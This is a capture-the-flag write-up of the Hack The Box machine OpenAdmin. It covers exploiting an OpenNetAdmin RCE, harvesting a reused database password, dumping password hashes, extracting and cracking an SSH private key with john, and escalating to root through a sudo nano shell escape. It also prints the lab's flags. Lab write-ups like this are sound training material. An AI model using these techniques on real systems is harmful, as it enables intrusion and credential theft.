## OpenAdmin HackTheBox solution

# Basic enumeration

dirbing, directories found:
* /artwork
* /music

*music* leads to .
```http://10.10.10.171/ona/```

user intefrace reveals:
* database name ona_default
* database username ona_user
* mysqli in locahost

# CVE hunting

open net admin v18.1.1 has [RCE vuln](https://www.nmmapper.com/st/exploitdetails/47691/42023/opennetadmin-1811-remote-code-execution/)

```
rc-ona.sh http://10.10.10.171/ona/

$ ls -latr /home
total 16
drwxr-xr-x 24 root   root   4096 Nov 21 13:41 ..
drwxr-xr-x  4 root   root   4096 Nov 22 18:00 .
drwxr-x---  6 joanna joanna 4096 Jan 15 22:33 joanna
drwxr-x---  6 jimmy  jimmy  4096 Jan 15 22:34 jimmy
```

Now we have user names. And database password:

```
$ cat local/config/*
<?php

$ona_contexts=array (
  'DEFAULT' => 
  array (
    'databases' => 
    array (
      0 => 
      array (
        'db_type' => 'mysqli',
        'db_host' => 'localhost',
        'db_login' => 'ona_sys',
        'db_passwd' => 'n1nj4W4rri0R!',
        'db_database' => 'ona_default',
        'db_debug' => false,
```

ops, jimmy has that password for ssh..

## SQL database

```
select * from users;
+----+----------+----------------------------------+-------+---------------------+---------------------+
| id | username | password                         | level | ctime               | atime               |
+----+----------+----------------------------------+-------+---------------------+---------------------+
|  1 | guest    | 098f6bcd4621d373cade4e832627b4f6 |     0 | 2020-01-15 23:09:48 | 2020-01-15 23:09:48 |
|  2 | admin    | 21232f297a57a5a743894a0e4a801fc3 |     0 | 2007-10-30 03:00:17 | 2007-12-02 22:10:26 |
+----+----------+----------------------------------+-------+---------------------+---------------------+
2 rows in set (0.00 sec)
```

212.. is admin decoded from the hash.

*jimmy* is in group *internal*

```
find / -group internal
```
/var/www/internal contains some files.

```
cat /var/www/internal/main.php 
<?php session_start(); if (!isset ($_SESSION['username'])) { header("Location: /index.php"); }; 
# Open Admin Trusted
# OpenAdmin
$output = shell_exec('cat /home/joanna/.ssh/id_rsa');
echo "<pre>$output</pre>";
?>
<html>
<h3>Don't forget your "ninja" password</h3>
Click here to logout <a href="logout.php" tite = "Logout">Session
</html>
```

And 
```
hash('sha512',$_POST['password']) == '00e302ccdcf1c60b8ad50ea50cf72b939705f49f40f0dc658801b4680b7d758eebdc2e9f9ba8ba3ef8a8bb9a796d34ba2e856838ee9bdde852b8ec3b3a0523b1') {
```

Revealed is the password for the hash

```
jimmy@openadmin:~$ curl 127.0.0.1:52846/main.php
<pre>-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,2AF25344B8391A25A9B318F3FD767D6D
```

Now we get the private key. 
what is the "ninja" password???

anyway, user flag:
c9b2cf07d40807e62af62660f0c81b5f

# Going for the root

open the ssh like this:
```
ssh -L 127.0.0.1:6666:127.0.0.1:52846 jimmy@10.10.10.171
```

First 127.. is a bind address, preventing anyone else from connecting to client machine. Second one is the target, the server is listening only local connections at OpenAadmin.

Now we can access from the localhost easily
```
root@rot-t420:~/htb-notes/openadmin# curl localhost:6666/main.php
```

Upload a web shell and we can explore as *Joanna*, without knowing the annoying "ninja" password, whatever that is.

## Ninja password

okay, the ninjapassword can be found by cracking the key
```
ssh2john privakey > johnpriva
john --wordlist=/usr/share/wordlists/rockyou.txt johnpriva
it's "bloodninjas"
```

## Final priv esc from nano

road to root from joanna is stupid.
joanna can edit /opt/priv file with sudo using *nano*. Why? No reason, totally absurd.
Anyway, nano can be exited to shell using ^R^X and then interactive shell can be spawned. There's the flag.

```
Command to execute: reset; sh 1>&0 2>&0# cat /root/root.txt                                                           
2f907ed450b361b2c2bf4e8795d5b561                           ^X Read File
#  Cancel                                  
```